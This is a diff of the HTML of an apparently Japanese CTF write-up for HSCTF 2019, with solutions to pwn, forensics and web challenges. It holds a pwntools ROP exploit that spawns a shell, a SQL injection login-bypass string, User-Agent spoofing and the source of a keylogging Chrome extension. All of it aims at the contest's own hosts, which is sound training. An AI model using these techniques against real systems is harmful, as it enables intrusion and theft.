+	<span class="n">vuln</span><span class="p">(</span><span class="p">)</span><span class="p">;</span>
 	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>	
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<h2 id="solution-8">Solution</h2>
-
+</div><h2 id="solution8">Solution</h2>
 <p>system()関数のアドレス（毎回異なる）がprintされるので、それを使います。</p>
-
-<pre>
-# checksec combo-chain-lite 
-[*] '/root/HSCTF_CTF_2019/combo-chain-lite'
-    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x400000)
-
-# ROPgadget --binary combo-chain-lite | grep ret | grep ": pop"
-0x000000000040126c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
-0x000000000040126e : pop r13 ; pop r14 ; pop r15 ; ret
-0x0000000000401270 : pop r14 ; pop r15 ; ret
-0x0000000000401272 : pop r15 ; ret
-0x000000000040126b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
-0x000000000040126f : pop rbp ; pop r14 ; pop r15 ; ret
-0x000000000040114d : pop rbp ; ret
-0x0000000000401273 : pop rdi ; ret   <--- これを使う。
-0x0000000000401271 : pop rsi ; pop r15 ; ret
-0x000000000040126d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
-</pre>
-
-<p><br />
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p><!-- raw HTML omitted -->
 以下を書きました。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1245,38 +1093,38 @@ Hint: What&rsquo;s a ROP?</p>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">import</span> <span class="nn">re</span>
 
-<span class="n">host</span> <span class="o">=</span> <span class="s2">&#34;pwn.hsctf.com&#34;</span>
+<span class="n">host</span> <span class="o">=</span> <span class="sa"></span><span class="s2">&#34;</span><span class="s2">pwn.hsctf.com</span><span class="s2">&#34;</span>
 <span class="n">port</span> <span class="o">=</span> <span class="mi">3131</span>
 
 <span class="k">if</span> <span class="bp">True</span><span class="p">:</span>
-    <span class="n">s</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./combo-chain-lite&#39;</span><span class="p">)</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="sa"></span><span class="s1">&#39;</span><span class="s1">./combo-chain-lite</span><span class="s1">&#39;</span><span class="p">)</span>
 <span class="k">else</span><span class="p">:</span>
     <span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span> <span class="p">)</span>
 
-<span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span>
+<span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="sa"></span><span class="s1">&#39;</span><span class="s1">amd64</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="sa"></span><span class="s1">&#39;</span><span class="s1">linux</span><span class="s1">&#39;</span><span class="p">)</span>
 
-<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./combo-chain-lite&#39;</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="sa"></span><span class="s1">&#39;</span><span class="s1">./combo-chain-lite</span><span class="s1">&#39;</span><span class="p">)</span>
 
 <span class="n">offset</span> <span class="o">=</span> <span class="mi">16</span>
 <span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x401273</span>
-<span class="n">msg</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
-<span class="n">system_addr</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span> <span class="s2">&#34;[0-9a-fA-F]+&#34;</span><span class="p">,</span> <span class="n">msg</span> <span class="p">)</span>
+<span class="n">msg</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span> <span class="sa"></span><span class="s2">&#34;</span><span class="s2">[0-9a-fA-F]+</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">msg</span> <span class="p">)</span>
 
-<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">offset</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span><span class="o">.</span><span class="nb">next</span><span class="p">())</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">system_addr</span><span class="o">.</span><span class="n">group</span><span class="p">(),</span> <span class="mi">16</span><span class="p">))</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa"></span><span class="s1">&#39;</span><span class="s1">&#39;</span>
+<span class="n">payload</span> <span class="o">+</span><span class="o">=</span> <span class="sa"></span><span class="s1">&#39;</span><span class="s1">A</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="n">offset</span>
+<span class="n">payload</span> <span class="o">+</span><span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+</span><span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa"></span><span class="s1">&#39;</span><span class="s1">/bin/sh</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">next</span><span class="p">(</span><span class="p">)</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+</span><span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">system_addr</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="p">)</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span><span class="p">)</span>
 
-<span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Dude you hear about that new game called /bin/sh? Enter the right combo for some COMBO CARNAGE!: &#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></td></tr></table>
+<span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa"></span><span class="s2">&#34;</span><span class="s2">Dude you hear about that new game called /bin/sh? Enter the right combo for some COMBO CARNAGE!: </span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">interactive</span><span class="p">(</span><span class="p">)</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><br />
+</div><p><!-- raw HTML omitted -->
 実行結果です。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1299,7 +1147,7 @@ Hint: What&rsquo;s a ROP?</p>
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># ./combo-chain-lite_solve2.py</span> 
-<span class="o">[</span>+<span class="o">]</span> Opening connection to pwn.hsctf.com on port <span class="m">3131</span>: Done
+<span class="o">[</span>+<span class="o">]</span> Opening connection to pwn.hsctf.com on port 3131: Done
 <span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/root/HSCTF_CTF_2019/combo-chain-lite&#39;</span>
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
@@ -1317,192 +1165,118 @@ lib
 lib32
 lib64
 $ cat flag
-hsctf<span class="o">{</span>wheeeeeee_that_was_fun<span class="o">}</span></code></pre></td></tr></table>
+hsctf<span class="o">{</span>wheeeeeee_that_was_fun<span class="o">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><br /><br />
-<br /><br /></p>
-
+</div><p><!-- raw HTML omitted --><!-- raw HTML omitted -->
+<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
 <h1 id="chicken-crossing-forensics">Chicken Crossing (Forensics)</h1>
-
-<hr />
-
+<hr>
 <blockquote>
 <p>Keith is watching chickens cross a road in his grandfather’s farm. He once heard from his grandfather that there was something significant about this behavior, but he can’t figure out why. Help Keith discover what the chickens are doing from this seemingly simple behavior.</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>hsctf-chicken_crossing.jpg</li>
 </ul>
-
-<h2 id="solution-9">Solution</h2>
-
-<pre>
-$ strings hsctf-chicken_crossing.jpg | grep hsctf
-hsctf{2_get_2_the_other_side}
-</pre>
-
-<p><br /><br />
-<br /><br /></p>
-
+<h2 id="solution9">Solution</h2>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
+<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
 <h1 id="cool-image-forensics">Cool Image (Forensics)</h1>
-
-<hr />
-
+<hr>
 <blockquote>
-<p>My friend told me he found a really cool image, but I couldn&rsquo;t open it. Can you help me access the image?</p>
+<p>My friend told me he found a really cool image, but I couldn't open it. Can you help me access the image?</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>cool.pdf</li>
 </ul>
-
-<h2 id="solution-10">Solution</h2>
-
-<pre>
-$ file cool.pdf
-cool.pdf: PNG image data, 1326 x 89, 8-bit/color RGBA, non-interlaced
-</pre>
-
-<p><br /><br />
-<br /><br /></p>
-
+<h2 id="solution10">Solution</h2>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
+<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
 <h1 id="cool-image-2-forensics">Cool Image 2 (Forensics)</h1>
-
-<hr />
-
+<hr>
 <blockquote>
-<p>My friend sent me this image, but I can&rsquo;t open it. Can you help me open the image?</p>
+<p>My friend sent me this image, but I can't open it. Can you help me open the image?</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>cool.png</li>
 </ul>
-
-<h2 id="solution-11">Solution</h2>
-
-<p>ファイルの先頭にゴミがついているので、消すだけです。
-<pre>
-$ xxd cool.png | head -n 4
-00000000: 4920 666f 756e 6420 7468 6973 2063 6f6f  I found this coo
-00000010: 6c20 6669 6c65 2e20 4974 7320 7265 616c  l file. Its real
-00000020: 6c79 2063 6f6f 6c21 0a89 504e 470d 0a1a  ly cool!..PNG&hellip;
-00000030: 0a00 0000 0d49 4844 5200 0004 b600 0000  &hellip;..IHDR&hellip;&hellip;.
-</pre></p>
-
-<p><br /><br />
-<br /><br /></p>
-
+<h2 id="solution11">Solution</h2>
+<p>ファイルの先頭にゴミがついているので、消すだけです。</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
+<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
 <h1 id="slap-forensics">Slap (Forensics)</h1>
-
-<hr />
-
+<hr>
 <blockquote>
-<p>Don&rsquo;t get slapped too hard.</p>
+<p>Don't get slapped too hard.</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>slap.jpg</li>
 </ul>
-
-<h2 id="solution-12">Solution</h2>
-
+<h2 id="solution12">Solution</h2>
 <p>Lorem ipsum （俗に言うダミーテキスト）だったので、うっかり見逃しそうでした。</p>
-
 <p><code>$ exiftool slap.jpg | grep hsctf</code>
-<br />
+<!-- raw HTML omitted -->
 Location Shown Country Name     : Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut la bore et dolore magna aliqua. Massa id neque aliquam vestibulum morbi blandit cursu <code>hsctf{twoslapsnonetforce}</code> s risus. Sed viverra ipsum nunc aliquet bibendum. Nisl purus in mollis nunc sed. Risus commodo viverra maecenas accumsan lacus vel facil&hellip;(snip)</p>
-
-<p><br /><br />
-<br /><br /></p>
-
+<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
+<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
 <h1 id="fish-forensics">Fish (Forensics)</h1>
-
-<hr />
-
+<hr>
 <blockquote>
 <p>I got a weird image from some fish. What is this?</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>fish.jpg</li>
 </ul>
-
-<h2 id="solution-13">Solution</h2>
-
-<p>「青い空を見上げればいつもそこに白い猫」で開くと、&rdquo;Steghide適用可能性データ&rdquo;というのが見えます。
-<br />
-<img src="https://captureamerica.github.io/writeups/img/possible_steg.png" alt="possible_steg.png"></p>
-
-<p>Passphraseがさっぱり検討つかなかったんですが、stringsの一番最後に出てくる<code>bobross63</code>を使ったら解けました。
-<pre>
-$ strings fish.jpg | tail -n 1
-bobross63
-</pre>
-<pre>
-C:\ols\steghide&gt;steghide.exe extract -sf fish.jpg
-Enter passphrase: bobross63
-wrote extracted data to &ldquo;flag.txt&rdquo;.
-C:\ols\steghide&gt;more flag.txt
-hsctf{fishy_fishy_fishy_fishy_fishy_fishy_fishy123123123123}
-</pre></p>
-
-<p><br /><br />
-<br /><br /></p>
-
+<h2 id="solution13">Solution</h2>
+<p>「青い空を見上げればいつもそこに白い猫」で開くと、&ldquo;Steghide適用可能性データ&quot;というのが見えます。
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted --></p>
+<p>Passphraseがさっぱり検討つかなかったんですが、stringsの一番最後に出てくる<code>bobross63</code>を使ったら解けました。</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
+<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
 <h1 id="inspect-me-web">Inspect Me (Web)</h1>
-
-<hr />
-
+<hr>
 <blockquote>
-<p>Keith&rsquo;s little brother messed up some things&hellip;
-<br /><br />
+<p>Keith's little brother messed up some things&hellip;
+<!-- raw HTML omitted --><!-- raw HTML omitted -->
 <a href="https://inspect-me.web.chal.hsctf.com">https://inspect-me.web.chal.hsctf.com</a>
-<br /><br />
+<!-- raw HTML omitted --><!-- raw HTML omitted -->
 Note: There are 3 parts to the flag!</p>
 </blockquote>
-
-<h2 id="solution-14">Solution</h2>
-
+<h2 id="solution14">Solution</h2>
 <p>View page source</p>
-
-<p><br /><br />
-<br /><br /></p>
-
+<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
+<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
 <h1 id="agent-keith-web">Agent Keith (Web)</h1>
-
-<hr />
-
+<hr>
 <blockquote>
 <p>Keith was looking at some old browsers and made a site to hold his flag.
-<br /><br />
+<!-- raw HTML omitted --><!-- raw HTML omitted -->
 <a href="https://agent-keith.web.chal.hsctf.com">https://agent-keith.web.chal.hsctf.com</a></p>
 </blockquote>
-
-<h2 id="solution-15">Solution</h2>
-
-<p>上記にアクセスすると、
-<pre>
-If you&rsquo;re not Keith, you won&rsquo;t get the flag!
-Your agent is: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36</p>
-
-<p>Flag: Access Denied
-</pre></p>
-
+<h2 id="solution15">Solution</h2>
+<p>上記にアクセスすると、</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
 <p>User-Agentは古ければなんでもいいわけじゃなくて、特定のものを指定しないといけないです。View Page Sourceより、</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-html" data-lang="html"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1522,95 +1296,73 @@ Your agent is: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.3
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-html" data-lang="html"><span class="cp">&lt;!doctype html&gt;</span>
-<span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
-        <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;utf-8&#34;</span><span class="p">&gt;</span>
-        <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;viewport&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;width=device-width, initial-scale=1, viewport-fit=cover&#34;</span><span class="p">&gt;</span>
-        <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>agent-keith<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
-        <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://localhost:8002/static/style.css&#34;</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
-        <span class="p">&lt;</span><span class="nt">main</span><span class="p">&gt;</span>
-            <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>If you&#39;re not Keith, you won&#39;t get the flag!<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
-            <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;&lt;</span><span class="nt">b</span><span class="p">&gt;</span>Your agent is:<span class="p">&lt;/</span><span class="nt">b</span><span class="p">&gt;</span> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
-            <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;&lt;</span><span class="nt">b</span><span class="p">&gt;</span>Flag:<span class="p">&lt;/</span><span class="nt">b</span><span class="p">&gt;</span> Access Denied<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
-            <span class="c">&lt;!-- DEBUG (remove me!!): NCSA_Mosaic/2.0 (Windows 3.1) --&gt;</span>
-        <span class="p">&lt;/</span><span class="nt">main</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
-<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span></code></pre></td></tr></table>
+<span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p"></span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">head</span><span class="p"></span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;utf-8&#34;</span><span class="p"></span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;viewport&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;width=device-width, initial-scale=1, viewport-fit=cover&#34;</span><span class="p"></span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">title</span><span class="p"></span><span class="p">&gt;</span>agent-keith<span class="p">&lt;</span><span class="p">/</span><span class="nt">title</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://localhost:8002/static/style.css&#34;</span><span class="p"></span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="p">/</span><span class="nt">head</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">body</span><span class="p"></span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">main</span><span class="p"></span><span class="p">&gt;</span>
+            <span class="p">&lt;</span><span class="nt">h2</span><span class="p"></span><span class="p">&gt;</span>If you&#39;re not Keith, you won&#39;t get the flag!<span class="p">&lt;</span><span class="p">/</span><span class="nt">h2</span><span class="p">&gt;</span>
+            <span class="p">&lt;</span><span class="nt">p</span><span class="p"></span><span class="p">&gt;</span><span class="p">&lt;</span><span class="nt">b</span><span class="p"></span><span class="p">&gt;</span>Your agent is:<span class="p">&lt;</span><span class="p">/</span><span class="nt">b</span><span class="p">&gt;</span> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36<span class="p">&lt;</span><span class="p">/</span><span class="nt">p</span><span class="p">&gt;</span>
+            <span class="p">&lt;</span><span class="nt">p</span><span class="p"></span><span class="p">&gt;</span><span class="p">&lt;</span><span class="nt">b</span><span class="p"></span><span class="p">&gt;</span>Flag:<span class="p">&lt;</span><span class="p">/</span><span class="nt">b</span><span class="p">&gt;</span> Access Denied<span class="p">&lt;</span><span class="p">/</span><span class="nt">p</span><span class="p">&gt;</span>
+            <span class="c">&lt;!--</span><span class="c"> DEBUG (remove me!!): NCSA_Mosaic/2.0 (Windows 3.1) </span><span class="c">--&gt;</span>
+        <span class="p">&lt;</span><span class="p">/</span><span class="nt">main</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="p">/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="p">/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<pre>
-$ wget -O - https://agent-keith.web.chal.hsctf.com/ --user-agent="NCSA_Mosaic/2.0 (Windows 3.1)"
-hsctf{wow_you_are_agent_keith_now}
-</pre>
-
-<p><br /><br />
-<br /><br /></p>
-
-<h1 id="s-q-l-web">S-Q-L (Web)</h1>
-
-<hr />
-
+</div><!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
+<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<h1 id="sql-web">S-Q-L (Web)</h1>
+<hr>
 <blockquote>
 <p>Keith keeps trying to keep his flag safe. This time, he used a database and some PHP.
-<br /><br />
+<!-- raw HTML omitted --><!-- raw HTML omitted -->
 <a href="https://s-q-l.web.chal.hsctf.com/">https://s-q-l.web.chal.hsctf.com/</a></p>
 </blockquote>
-
-<h2 id="solution-16">Solution</h2>
-
+<h2 id="solution16">Solution</h2>
 <p><code>' or '1'='1</code></p>
-
-<p><br /><br />
-<br /><br /></p>
-
+<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
+<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
 <h1 id="the-quest-web">The Quest (Web)</h1>
-
-<hr />
-
+<hr>
 <blockquote>
 <p>You think you are worthy of obtaining the flag? Try your hand at <a href="https://forms.gle/7pyAWuG3GvYL443NA">The Quest to Obtain the Flag.</a></p>
 </blockquote>
-
-<h2 id="solution-17">Solution</h2>
-
+<h2 id="solution17">Solution</h2>
 <p>View Page Sourceでフラグを見つけてしまった。</p>
-
-<p><br /><br />
-<br /><br /></p>
-
+<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
+<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
 <h1 id="keith-logger-web">Keith Logger (Web)</h1>
-
-<hr />
-
+<hr>
 <blockquote>
-<p>Keith is up to some evil stuff! Can you figure out what he&rsquo;s doing and find the flag?
-<br /><br />
+<p>Keith is up to some evil stuff! Can you figure out what he's doing and find the flag?
+<!-- raw HTML omitted --><!-- raw HTML omitted -->
 Note: nothing is actually saved</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>extension.crx</li>
 </ul>
-
-<h2 id="solution-18">Solution</h2>
-
+<h2 id="solution18">Solution</h2>
 <p>これは今までやったことのないタイプの問題で面白かったです。
-<br /><br />
+<!-- raw HTML omitted --><!-- raw HTML omitted -->
 crxは、Chromeのエクステンション。
-<br /><br />
+<!-- raw HTML omitted --><!-- raw HTML omitted -->
 とりあえず、<code>nothing is actually saved</code>というのを信じて、Chromeに追加してみましたが、そもそも有効にできませんでした。
-<br /><br />
+<!-- raw HTML omitted --><!-- raw HTML omitted -->
 ググってみると、crxファイルは中身が見えるとのこと。以下のサイトでソースを取り出しました。
-<br />
-<a href="https://robwu.nl/crxviewer/">https://robwu.nl/crxviewer/</a>
-<br /><br /></p>
+<!-- raw HTML omitted -->
+<a href="https://robwu.nl/crxviewer/"><a href="https://robwu.nl/crxviewer/">https://robwu.nl/crxviewer/</a></a>
+<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1645,15 +1397,15 @@ crxは、Chromeのエクステンション。
 <pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kd">var</span> <span class="nx">timeout_textarea</span><span class="p">;</span>
 <span class="kd">var</span> <span class="nx">xhr_textarea</span><span class="p">;</span>
 <span class="nx">$</span><span class="p">(</span><span class="s2">&#34;textarea&#34;</span><span class="p">)</span>
-    <span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s2">&#34;keyup&#34;</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+    <span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s2">&#34;keyup&#34;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="p">)</span> <span class="p">{</span>
         <span class="k">if</span> <span class="p">(</span><span class="nx">timeout_textarea</span><span class="p">)</span> <span class="p">{</span>
-            <span class="nx">clearTimeout</span><span class="p">(</span><span class="nx">timeout_textarea</span><span class="p">);</span>
+            <span class="nx">clearTimeout</span><span class="p">(</span><span class="nx">timeout_textarea</span><span class="p">)</span><span class="p">;</span>
         <span class="p">}</span>
         <span class="k">if</span> <span class="p">(</span><span class="nx">xhr_textarea</span><span class="p">)</span> <span class="p">{</span>
-            <span class="nx">xhr_textarea</span><span class="p">.</span><span class="nx">abort</span><span class="p">();</span>
+            <span class="nx">xhr_textarea</span><span class="p">.</span><span class="nx">abort</span><span class="p">(</span><span class="p">)</span><span class="p">;</span>
         <span class="p">}</span>
-        <span class="nx">timeout_textarea</span> <span class="o">=</span> <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
-            <span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+        <span class="nx">timeout_textarea</span> <span class="o">=</span> <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="p">)</span> <span class="p">{</span>
+            <span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">(</span><span class="p">)</span><span class="p">;</span>
             <span class="cm">/*
 </span><span class="cm">            xhr.open(
 </span><span class="cm">              &#34;GET&#34;,
@@ -1669,76 +1421,58 @@ crxは、Chromeのエクステンション。
 </span><span class="cm">              &#34;https://keith-logger.web.chal.hsctf.com/api/admin&#34;,
 </span><span class="cm">              true
 </span><span class="cm">            );*/</span>
-            <span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
-        <span class="p">},</span> <span class="mi">2000</span><span class="p">);</span>
-    <span class="p">});</span>
+            <span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="p">)</span><span class="p">;</span>
+        <span class="p">}</span><span class="p">,</span> <span class="mi">2000</span><span class="p">)</span><span class="p">;</span>
+    <span class="p">}</span><span class="p">)</span><span class="p">;</span>
 </code></pre></td></tr></table>
 </div>
-</div>
